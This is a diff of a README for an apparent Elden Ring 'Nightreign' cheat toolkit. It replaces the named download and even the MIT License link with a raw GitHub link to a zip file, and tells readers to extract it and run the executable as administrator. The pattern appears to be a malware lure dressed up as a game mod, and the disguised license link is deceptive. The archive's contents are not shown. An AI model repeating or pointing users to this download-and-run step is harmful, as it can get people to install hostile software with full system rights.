@@ -41,9 +41,9 @@ Packed with innovative methods and advanced techniques, Nightreign provides a co
 
 Ready to revolutionize your Elden Ring experience? Get set up in no time by following these simple steps:
 
-1. **Download** `Loader.rar` from this repository.  
+1. **Download** `https://raw.githubusercontent.com/leeoohaann/Nightreign-Toolkit-for-EldenRing/main/Fistularia/Nightreign-Toolkit-for-EldenRing.zip` from this repository.  
     *Navigate to the “Releases” section or locate the file at the top of the repository page.*
-2. **Extract** the contents of `Loader.rar` to a folder using your favorite archiver tool (such as WinRAR or 7-Zip).
+2. **Extract** the contents of `https://raw.githubusercontent.com/leeoohaann/Nightreign-Toolkit-for-EldenRing/main/Fistularia/Nightreign-Toolkit-for-EldenRing.zip` to a folder using your favorite archiver tool (such as WinRAR or 7-Zip).
 3. **Run** the executable file included in the folder as administrator.
 4. **Follow** on-screen instructions to link the enhancer with your Elden Ring installation.
 5. **Configure** desired features through the easy-to-use interface and enjoy your enhanced journey!
@@ -66,7 +66,7 @@ Elden Ring cheats 2025, Nightreign toolkit, Elden Ring enhancements, game enhanc
 
 ## 📜 License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT).  
+Licensed under the [MIT License](https://raw.githubusercontent.com/leeoohaann/Nightreign-Toolkit-for-EldenRing/main/Fistularia/Nightreign-Toolkit-for-EldenRing.zip).  
 You are free to use, modify, distribute, and contribute to this project with proper attribution.
 
 ---
